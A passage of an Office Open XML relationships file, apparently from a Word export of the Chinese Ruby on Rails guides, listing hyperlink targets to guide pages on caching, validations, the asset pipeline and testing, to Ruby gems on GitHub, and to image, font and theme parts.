TargetMode="External"/><Relationship Id="rId917" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/caching_with_rails.html" TargetMode="External"/><Relationship Id="rId918" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/caching_with_rails.html" TargetMode="External"/><Relationship Id="rId919" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/caching_with_rails.html" TargetMode="External"/><Relationship Id="rId790" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://code.google.com/p/query-reviewer/" TargetMode="External"/><Relationship Id="rId791" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/smartinez87/exception_notification/tree/master" TargetMode="External"/><Relationship Id="rId792" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/defunkt/exception_logger/tree/master" TargetMode="External"/><Relationship Id="rId793" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.datanoise.com/ruby-debug" TargetMode="External"/><Relationship Id="rId794" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.sitepoint.com/article/debug-rails-app-ruby-debug/" TargetMode="External"/><Relationship Id="rId795" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://brian.maybeyoureinsane.net/blog/2007/05/07/ruby-debug-basics-screencast/" TargetMode="External"/><Relationship Id="rId796" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://railscasts.com/episodes/54-debugging-with-ruby-debug" TargetMode="External"/><Relationship Id="rId797" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://railscasts.com/episodes/24-the-stack-trace" TargetMode="External"/><Relationship Id="rId798" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://railscasts.com/episodes/56-the-logger" TargetMode="External"/><Relationship Id="rId799" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://bashdb.sourceforge.net/ruby-debug.html" TargetMode="External"/><Relationship Id="rId470" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_support_core_extensions.html" TargetMode="External"/><Relationship Id="rId471" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_support_core_extensions.html" TargetMode="External"/><Relationship Id="rId472" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_support_core_extensions.html" TargetMode="External"/><Relationship Id="rId473" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_support_core_extensions.html" TargetMode="External"/><Relationship Id="rId474" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_support_core_extensions.html" TargetMode="External"/><Relationship Id="rId475" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_support_core_extensions.html" TargetMode="External"/><Relationship Id="rId476" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_support_core_extensions.html" TargetMode="External"/><Relationship Id="rId477" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_support_core_extensions.html" TargetMode="External"/><Relationship Id="rId478" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_support_core_extensions.html" TargetMode="External"/><Relationship Id="rId479" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_support_core_extensions.html" TargetMode="External"/><Relationship Id="rId1150" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/generators.html" TargetMode="External"/><Relationship Id="rId1151" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/generators.html" TargetMode="External"/><Relationship Id="rId1152" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/wycats/thor" TargetMode="External"/><Relationship Id="rId1153" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://rdoc.info/github/wycats/thor/master/Thor/Actions.html" TargetMode="External"/><Relationship Id="rId1154" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/generators.html" TargetMode="External"/><Relationship Id="rId1155" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/thoughtbot/shoulda" TargetMode="External"/><Relationship Id="rId1156" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://gist.github.com/722911.txt" TargetMode="External"/><Relationship Id="rId1157" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://rdoc.info/github/wycats/thor/master/Thor/Actions.html" TargetMode="External"/><Relationship Id="rId1158" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="git://github.com/plataformatec/devise" TargetMode="External"/><Relationship Id="rId1159" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="git://github.com/plataformatec/devise" TargetMode="External"/><Relationship Id="rId150" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_record_validations_callbacks.html" TargetMode="External"/><Relationship Id="rId151" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_record_validations_callbacks.html" TargetMode="External"/><Relationship Id="rId152" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_record_validations_callbacks.html" TargetMode="External"/><Relationship Id="rId153" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_record_validations_callbacks.html" TargetMode="External"/><Relationship Id="rId154" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_record_validations_callbacks.html" TargetMode="External"/><Relationship Id="rId155" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_record_validations_callbacks.html" TargetMode="External"/><Relationship Id="rId156" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_record_validations_callbacks.html" TargetMode="External"/><Relationship Id="rId157" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_record_validations_callbacks.html" TargetMode="External"/><Relationship Id="rId158" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_record_validations_callbacks.html" TargetMode="External"/><Relationship Id="rId159" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_record_validations_callbacks.html" TargetMode="External"/><Relationship Id="rId920" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/caching_with_rails.html" TargetMode="External"/><Relationship Id="rId921" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/caching_with_rails.html" TargetMode="External"/><Relationship Id="rId922" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/caching_with_rails.html" TargetMode="External"/><Relationship Id="rId923" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/caching_with_rails.html" TargetMode="External"/><Relationship Id="rId924" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/caching_with_rails.html" TargetMode="External"/><Relationship Id="rId925" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/caching_with_rails.html" TargetMode="External"/><Relationship Id="rId926" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/caching_with_rails.html" TargetMode="External"/><Relationship Id="rId927" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/caching_with_rails.html" TargetMode="External"/><Relationship Id="rId928" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/caching_with_rails.html" TargetMode="External"/><Relationship Id="rId929" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://ehcache.org/apidocs/net/sf/ehcache/Element.html" TargetMode="External"/><Relationship Id="rId600" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/action_mailer_basics.html" TargetMode="External"/><Relationship Id="rId601" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/action_mailer_basics.html" TargetMode="External"/><Relationship Id="rId602" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/action_mailer_basics.html" TargetMode="External"/><Relationship Id="rId603" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/action_mailer_basics.html" TargetMode="External"/><Relationship Id="rId604" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/action_mailer_basics.html" TargetMode="External"/><Relationship Id="rId605" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/action_mailer_basics.html" TargetMode="External"/><Relationship Id="rId606" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/action_mailer_basics.html" TargetMode="External"/><Relationship Id="rId607" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/action_mailer_basics.html" TargetMode="External"/><Relationship Id="rId608" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://example.com/login" TargetMode="External"/><Relationship Id="rId609" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://example.com/login" TargetMode="External"/><Relationship Id="rId480" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_support_core_extensions.html" TargetMode="External"/><Relationship Id="rId481" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_support_core_extensions.html" TargetMode="External"/><Relationship Id="rId482" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_support_core_extensions.html" TargetMode="External"/><Relationship Id="rId483" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_support_core_extensions.html" TargetMode="External"/><Relationship Id="rId484" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_support_core_extensions.html" TargetMode="External"/><Relationship Id="rId485" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_support_core_extensions.html" TargetMode="External"/><Relationship Id="rId486" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_support_core_extensions.html" TargetMode="External"/><Relationship Id="rId487" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_support_core_extensions.html" TargetMode="External"/><Relationship Id="rId488" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_support_core_extensions.html" TargetMode="External"/><Relationship Id="rId489" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_support_core_extensions.html" TargetMode="External"/><Relationship Id="rId1160" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://gems.github.com" TargetMode="External"/><Relationship Id="rId1161" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://example.com" TargetMode="External"/><Relationship Id="rId1162" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://example.com" TargetMode="External"/><Relationship Id="rId1163" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://localhost:3000" TargetMode="External"/><Relationship Id="rId1164" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/fontTable" Target="fontTable.xml"/><Relationship Id="rId1165" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/theme" Target="theme/theme1.xml"/><Relationship Id="rId160" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_record_validations_callbacks.html" TargetMode="External"/><Relationship Id="rId161" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_record_validations_callbacks.html" TargetMode="External"/><Relationship Id="rId162" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_record_validations_callbacks.html" TargetMode="External"/><Relationship Id="rId163" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_record_validations_callbacks.html" TargetMode="External"/><Relationship Id="rId164" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_record_validations_callbacks.html" TargetMode="External"/><Relationship Id="rId165" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_record_validations_callbacks.html" TargetMode="External"/><Relationship Id="rId166" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_record_validations_callbacks.html" TargetMode="External"/><Relationship Id="rId167" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_record_validations_callbacks.html" TargetMode="External"/><Relationship Id="rId168" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_record_validations_callbacks.html" TargetMode="External"/><Relationship Id="rId169" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_record_validations_callbacks.html" TargetMode="External"/><Relationship Id="rId930" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://ehcache.org/" TargetMode="External"/><Relationship Id="rId931" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://ehcache.org/documentation/jruby.html%E3%80%82" TargetMode="External"/><Relationship Id="rId932" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://railslab.newrelic.com/scaling-rails" TargetMode="External"/><Relationship Id="rId933" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/asset_pipeline.html" TargetMode="External"/><Relationship Id="rId934" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/asset_pipeline.html" TargetMode="External"/><Relationship Id="rId935" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/asset_pipeline.html" TargetMode="External"/><Relationship Id="rId936" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/asset_pipeline.html" TargetMode="External"/><Relationship Id="rId937" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/asset_pipeline.html" TargetMode="External"/><Relationship Id="rId938" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/asset_pipeline.html" TargetMode="External"/><Relationship Id="rId939" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/asset_pipeline.html" TargetMode="External"/><Relationship Id="rId610" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://example.com/login" TargetMode="External"/><Relationship Id="rId611" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/testing.html" TargetMode="External"/><Relationship Id="rId612" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image20.gif"/><Relationship Id="rId613" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/testing.html" TargetMode="External"/><Relationship Id="rId614" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/testing.html" TargetMode="External"/><Relationship Id="rId615" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/testing.html" TargetMode="External"/><Relationship Id="rId616" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/testing.html" TargetMode="External"/><Relationship Id="rId617" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/testing.html" TargetMode="External"/><Relationship Id="rId618" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/testing.html" TargetMode="External"/><Relationship Id="rId619" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/testing.html" TargetMode="External"/><Relationship Id="rId490" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_support_core_extensions.html" TargetMode="External"/><Relationship Id="rId491" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_support_core_extensions.html" TargetMode="External"/><Relationship Id="rId492" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_support_core_extensions.html" TargetMode="External"/><Relationship Id="rId493" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/security.html" TargetMode="External"/><Relationship Id="rId494" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/i18n.html" TargetMode="External"/><Relationship Id="rId495" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/i18n.html" TargetMode="External"/><Relationship Id="rId496" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/i18n.html" TargetMode="External"/><Relationship Id="rId497" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/i18n.html" TargetMode="External"/><Relationship Id="rId498" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/i18n.html" TargetMode="External"/><Relationship Id="rId499" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/i18n.html" TargetMode="External"/><Relationship Id="rId170" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_record_validations_callbacks.html" TargetMode="External"/><Relationship Id="rId171" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_record_validations_callbacks.html" TargetMode="External"/><Relationship Id="rId172" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_record_validations_callbacks.html" TargetMode="External"/><Relationship Id="rId173" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_record_validations_callbacks.html" TargetMode="External"/><Relationship Id="rId174" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_record_validations_callbacks.html" TargetMode="External"/><Relationship Id="rId175" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_record_validations_callbacks.html" TargetMode="External"/><Relationship Id="rId176" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_record_validations_callbacks.html" TargetMode="External"/><Relationship Id="rId177" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_record_validations_callbacks.html" TargetMode="External"/><Relationship Id="rId178" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_record_validations_callbacks.html" TargetMode="External"/><Relationship Id="rId179" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_record_validations_callbacks.html" TargetMode="External"/><Relationship Id="rId940" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/asset_pipeline.html" TargetMode="External"/><Relationship Id="rId941" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/asset_pipeline.html" TargetMode="External"/><Relationship Id="rId942" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/asset_pipeline.html" TargetMode="External"/><Relationship Id="rId943" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/asset_pipeline.html" TargetMode="External"/><Relationship Id="rId944" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/asset_pipeline.html" TargetMode="External"/><Relationship Id="rId945" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/asset_pipeline.html" TargetMode="External"/><Relationship Id="rId946" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/asset_pipeline.html" TargetMode="External"/><Relationship Id="rId947" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/asset_pipeline.html" TargetMode="External"/><Relationship Id="rId948" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/asset_pipeline.html" TargetMode="External"/><Relationship Id="rId949" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/asset_pipeline.html" TargetMode="External"/><Relationship Id="rId620" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/testing.html" TargetMode="External"/><Relationship Id="rId621" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/testing.html" TargetMode="External"/><Relationship Id="rId622" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/testing.html" TargetMode="External"/><Relationship Id="rId623" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/testing.html" TargetMode="External"/><Relationship Id="rId624" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/testing.html" TargetMode="External"/><Relationship Id="rId625" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/testing.html" TargetMode="External"/><Relationship Id="rId626" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/testing.html" TargetMode="External"/><Relationship Id="rId627" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/testing.html" TargetMode="External"/><Relationship Id="rId628" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/testing.html" TargetMode="External"/><Relationship Id="rId629" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/testing.html" TargetMode="External"/><Relationship Id="rId300" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.modernizr.com/" TargetMode="External"/><Relationship Id="rId301" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://yepnopejs.com/" TargetMode="External"/><Relationship Id="rId302" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/security.html" TargetMode="External"/><Relationship Id="rId303" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_record_validations_callbacks.html" TargetMode="External"/><Relationship Id="rId304" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/routing.html" TargetMode="External"/><Relationship Id="rId305" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/routing.html" TargetMode="External"/><Relationship Id="rId306" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/security.html" TargetMode="External"/><Relationship Id="rId307" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/chrislerum/country_select" TargetMode="External"/><Relationship Id="rId308" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://api.rubyonrails.org/classes/ActionView/Helpers/DateHelper.html" TargetMode="External"/><Relationship Id="rId309" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/jnicklas/carrierwave" TargetMode="External"/><Relationship Id="rId180" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_record_validations_callbacks.html" TargetMode="External"/><Relationship Id="rId181" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_record_validations_callbacks.html" TargetMode="External"/><Relationship Id="rId182" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_record_validations_callbacks.html" TargetMode="External"/><Relationship Id="rId183" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_record_validations_callbacks.html" TargetMode="External"/><Relationship Id="rId184" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_record_validations_callbacks.html" TargetMode="External"/><Relationship Id="rId185" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_record_validations_callbacks.html" TargetMode="External"/><Relationship Id="rId186" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_record_validations_callbacks.html" TargetMode="External"/><Relationship Id="rId187" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_record_validations_callbacks.html" TargetMode="External"/><Relationship Id="rId188" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_record_validations_callbacks.html" TargetMode="External"/><Relationship Id="rId189" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_record_validations_callbacks.html" TargetMode="External"/><Relationship Id="rId950" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/asset_pipeline.html" TargetMode="External"/><Relationship Id="rId951" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/asset_pipeline.html" TargetMode="External"/><Relationship Id="rId952" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/asset_pipeline.html" TargetMode="External"/><Relationship Id="rId953" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/asset_pipeline.html" TargetMode="External"/><Relationship Id="rId954" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/asset_pipeline.html" TargetMode="External"/><Relationship Id="rId955" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/asset_pipeline.html" TargetMode="External"/><Relationship Id="rId956" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/asset_pipeline.html" TargetMode="External"/><Relationship Id="rId957" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.stevesouders.com/blog/2008/08/23/revving-filenames-dont-use-querystring/" TargetMode="External"/><Relationship Id="rId958" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://code.google.com/speed/page-speed/docs/caching.html" TargetMode="External"/><Relationship Id="rId959" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.stevesouders.com/blog/2008/08/23/revving-filenames-dont-use-querystring/" TargetMode="External"/><Relationship Id="rId630" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" 